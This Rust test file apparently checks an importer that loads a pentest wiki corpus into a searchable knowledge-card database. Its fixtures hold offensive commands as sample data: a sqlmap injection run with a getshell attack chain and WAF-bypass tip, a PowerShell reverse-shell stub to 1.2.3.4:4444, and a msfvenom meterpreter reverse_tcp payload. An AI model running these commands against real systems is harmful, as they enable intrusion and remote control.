//! 导入器测试：hermetic fixture（最小 Wiki JSON）→ 转换 → 仓储 →
//! 检索冒烟 → 幂等重跑。全部确定性，不依赖真实外部语料目录。

#![cfg(test)]
#![allow(clippy::unwrap_used)]

use std::path::Path;

use crate::{import_directory, payloads_to_units, shells_to_units, tools_to_units};
use models::KnowledgeRetrievalQuery;
use storage::Repository;
use storage::SqliteRepository;

/// 最小 webPayloads fixture（真实 schema 的 1:1 缩样）。
const WEB_PAYLOADS: &str = r#"[
  {
    "id": "sqli-mysql-union",
    "name": {"zh": "MySQL 联合查询注入", "en": "MySQL union injection"},
    "description": {"zh": "通过 UNION SELECT 读取数据", "en": "Read data via UNION SELECT"},
    "category": {"zh": "Web安全", "en": "Web Security"},
    "subCategory": {"zh": "SQL注入", "en": "SQL Injection"},
    "tags": ["mysql", "sqli"],
    "prerequisites": [{"zh": "存在回显位", "en": "reflective output"}],
    "execution": [
      {"title": {"zh": "探测列数", "en": "probe columns"},
       "command": "sqlmap -u http://target/item.php?id=1 --dbs --batch",
       "description": {"zh": "自动化注入", "en": "automated injection"}}
    ],
    "opsecTips": {"zh": "避免高频请求触发 WAF", "en": "avoid high-frequency requests"},
    "attackChain": "SQLi -> 信息收集 -> 后台登录 -> 上传 getshell -> 内网",
    "analysis": {"zh": "返回数据库版本即验证成功", "en": ""},
    "wafBypass": {"zh": "内联注释拆分关键字", "en": ""}
  }
]"#;

/// 最小 toolCommands fixture。
const TOOL_COMMANDS: &str = r#"[
  {
    "id": "sqlmap",
    "name": {"zh": "sqlmap", "en": "sqlmap"},
    "description": {"zh": "自动化 SQL 注入工具", "en": "Automated SQL injection tool"},
    "category": {"zh": "渗透测试", "en": "Penetration"},
    "installation": {"zh": "pip install sqlmap", "en": "pip install sqlmap"},
    "commands": [
      {"name": {"zh": "基础检测", "en": "basic detection"},
       "command": "sqlmap -u <url> --batch",
       "description": {"zh": "对单个 URL 做注入检测", "en": "detect on a single URL"},
       "platform": "Windows"},
      {"name": {"zh": "带 Cookie", "en": "with cookie"},
       "command": "sqlmap -u <url> --cookie=\"SESS=x\" --level 3",
       "description": {"zh": "需要会话时提升 level", "en": "raise level with session"},
       "platform": "Linux"}
    ]
  }
]"#;

/// 最小 reverseShell fixture（分组对象形态）。
const REVERSE_SHELL: &str = r#"{
  "cmd": [
    {"name": "PowerShell TCP", "command": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('1.2.3.4',4444)\"",
     "meta": ["powershell", "tcp", "windows"]}
  ],
  "msf": [
    {"name": "MSF reverse_tcp", "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4",
     "meta": ["meterpreter", "x64"]}
  ]
}"#;

fn write_fixture(directory: &Path) {
    std::fs::create_dir_all(directory).unwrap();
    std::fs::write(directory.join("webPayloads.json"), WEB_PAYLOADS).unwrap();
    std::fs::write(directory.join("toolCommands.json"), TOOL_COMMANDS).unwrap();
    std::fs::write(directory.join("reverseShell.json"), REVERSE_SHELL).unwrap();
}

fn temp_repo(tag: &str) -> (tempfile::TempDir, SqliteRepository) {
    let dir = tempfile::TempDir::with_prefix(format!("tools_{tag}_")).unwrap();
    let repo = SqliteRepository::open(dir.path().join("import.sqlite3")).unwrap();
    (dir, repo)
}

#[test]
fn converters_split_payload_tool_and_shell() {
    let payload_items: Vec<serde_json::Value> =
        serde_json::from_str(&WEB_PAYLOADS.replace("__source", "__unused")).unwrap();
    let payloads = payloads_to_units(&payload_items);
    assert_eq!(
        payloads.len(),
        1,
        "1 payload ≈ 1 primary unit（attackChain 未超限）"
    );
    assert_eq!(payloads[0].kind, models::KnowledgeCardKind::PayloadStrategy);
    assert!(payloads[0].summary.contains("UNION"), "双语描述进 summary");
    assert!(payloads[0].body.contains("OPSEC"), "OPSEC 进 body");
    assert_eq!(
        payloads[0].id.as_ref().unwrap().as_str(),
        "kcard_security_wiki_webpayloads_sqli-mysql-union"
    );

    let tool_items: Vec<serde_json::Value> = serde_json::from_str(TOOL_COMMANDS).unwrap();
    let tools = tools_to_units(&tool_items);
    assert_eq!(tools.len(), 3, "1 tool summary + 2 command units");
    let summary = &tools[0];
    assert!(summary.parent_id.is_none());
    let children: Vec<_> = tools[1..].iter().collect();
    for child in children {
        assert_eq!(
            child
                .parent_id
                .as_ref()
                .map(models::KnowledgeCardId::as_str),
            summary.id.as_ref().map(models::KnowledgeCardId::as_str),
            "command unit 必须挂父"
        );
        assert!(child.body.contains("命令:"), "命令完整进 body");
    }

    let shell_items =
        flatten_shell(&serde_json::from_str::<serde_json::Value>(REVERSE_SHELL).unwrap());
    let shells = shells_to_units(&shell_items);
    assert_eq!(shells.len(), 2, "1 command = 1 unit");
    assert!(shells[0].platform.contains(&"windows".to_string()));
    assert!(
        shells[0]
            .source
            .as_deref()
            .unwrap()
            .contains("reverseShell")
    );
}

/// 与 `import_directory` 相同的分组对象展开（测试侧镜像）。
fn flatten_shell(value: &serde_json::Value) -> Vec<serde_json::Value> {
    let mut items = Vec::new();
    if let Some(map) = value.as_object() {
        for (category, group) in map {
            if let Some(entries) = group.as_array() {
                for entry in entries {
                    let mut entry = entry.clone();
                    if let Some(obj) = entry.as_object_mut() {
                        obj.entry("__category".to_string())
                            .or_insert_with(|| serde_json::Value::String(category.clone()));
                    }
                    items.push(entry);
                }
            }
        }
    }
    items
}

#[test]
fn import_is_retrieval_ready_and_idempotent() {
    let (_dir, repo) = temp_repo("idem");
    let wiki = tempfile::TempDir::with_prefix("wiki_").unwrap();
    write_fixture(wiki.path());

    let first = import_directory(&repo, wiki.path()).unwrap();
    assert_eq!(first.files, 3);
    assert_eq!(first.payload_units, 1);
    assert_eq!(first.tool_units, 1);
    assert_eq!(first.command_units, 2);
    assert_eq!(first.shell_units, 2);
    assert_eq!(first.skipped_unchanged, 0);

    // 幂等：重复导入 = 全部跳过。
    let second = import_directory(&repo, wiki.path()).unwrap();
    assert_eq!(
        second.skipped_unchanged,
        first.payload_units + first.tool_units + first.command_units + first.shell_units
    );
    assert_eq!(
        second.payload_units + second.tool_units + second.command_units + second.shell_units,
        0
    );

    // 检索冒烟：走新的 FTS 管线（中文/英文/混合）。
    let mut query = KnowledgeRetrievalQuery::new();
    query.text = "SQL 注入 union".to_string();
    let hits = repo.search_knowledge_cards(&query).unwrap();
    assert!(
        hits.iter().any(|result| result
            .card
            .source
            .as_deref()
            .unwrap()
            .contains("sqli-mysql-union")),
        "中文 payload query 必须命中导入卡"
    );

    let mut tool_query = KnowledgeRetrievalQuery::new();
    tool_query.text = "sqlmap --level".to_string();
    let tool_hits = repo.search_knowledge_cards(&tool_query).unwrap();
    assert!(
        tool_hits
            .iter()
            .any(|result| result.card.tool.contains(&"sqlmap".to_string())),
        "CLI flag query 必须命中 sqlmap command unit"
    );

    // 索引收口：sync 后 ready。
    let status = repo.sync_knowledge_index().unwrap();
    assert_eq!(status.state, models::KnowledgeCorpusState::Ready);
    let total_units = first.payload_units
        + first.payload_children
        + first.tool_units
        + first.command_units
        + first.shell_units;
    assert_eq!(
        status.indexed_count,
        i64::try_from(total_units).unwrap_or(-1)
    );
}

#[test]
fn sensitive_asset_suffix_is_imported() {
    let (_dir, repo) = temp_repo("asset_suffix");
    let wiki = tempfile::TempDir::with_prefix("wiki_assets_").unwrap();
    std::fs::write(wiki.path().join("toolCommands.json.asset"), TOOL_COMMANDS).unwrap();
    std::fs::write(wiki.path().join("reverseShell.json.asset"), REVERSE_SHELL).unwrap();

    let summary = import_directory(&repo, wiki.path()).unwrap();
    assert_eq!(summary.files, 2);
    assert_eq!(summary.tool_units, 1);
    assert_eq!(summary.command_units, 2);
    assert_eq!(summary.shell_units, 2);
}

#[test]
fn deterministic_ids_across_directories() {
    let wiki_a = tempfile::TempDir::with_prefix("wiki_a_").unwrap();
    let wiki_b = tempfile::TempDir::with_prefix("wiki_b_").unwrap();
    write_fixture(wiki_a.path());
    write_fixture(wiki_b.path());
    let (_dir_a, repo_a) = temp_repo("det_a");
    let (_dir_b, repo_b) = temp_repo("det_b");
    import_directory(&repo_a, wiki_a.path()).unwrap();
    import_directory(&repo_b, wiki_b.path()).unwrap();
    let ids_a: Vec<String> = repo_a
        .list_knowledge_cards()
        .unwrap()
        .into_iter()
        .map(|card| card.id.as_str().to_string())
        .collect();
    let ids_b: Vec<String> = repo_b
        .list_knowledge_cards()
        .unwrap()
        .into_iter()
        .map(|card| card.id.as_str().to_string())
        .collect();
    assert_eq!(ids_a, ids_b, "同源数据在任意目录导入必须产出同一 id 集");
}
